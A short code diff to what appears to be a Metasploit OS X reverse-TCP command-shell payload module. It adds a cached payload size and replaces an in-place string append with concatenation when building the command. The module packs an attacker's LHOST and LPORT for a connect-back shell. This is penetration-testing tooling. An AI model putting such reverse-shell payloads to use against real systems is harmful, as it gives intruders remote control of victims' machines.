@@ -9,6 +9,8 @@ require 'msf/core/handler/reverse_tcp'
 
 module Metasploit3
 
+  CachedSize = 108
+
   include Msf::Payload::Single
   include Msf::Payload::Osx
   include Msf::Sessions::CommandShellOptions
@@ -43,7 +45,7 @@ module Metasploit3
       raise ArgumentError, "LHOST must be in IPv4 format."
     end
 
-    cmd  = (datastore['CMD'] || '') << "\x00"
+    cmd  = (datastore['CMD'] || '') + "\x00"
     port = [datastore['LPORT'].to_i].pack('n')
     ipaddr = [lhost.split('.').inject(0) {|t,v| (t << 8 ) + v.to_i}].pack("N")
 
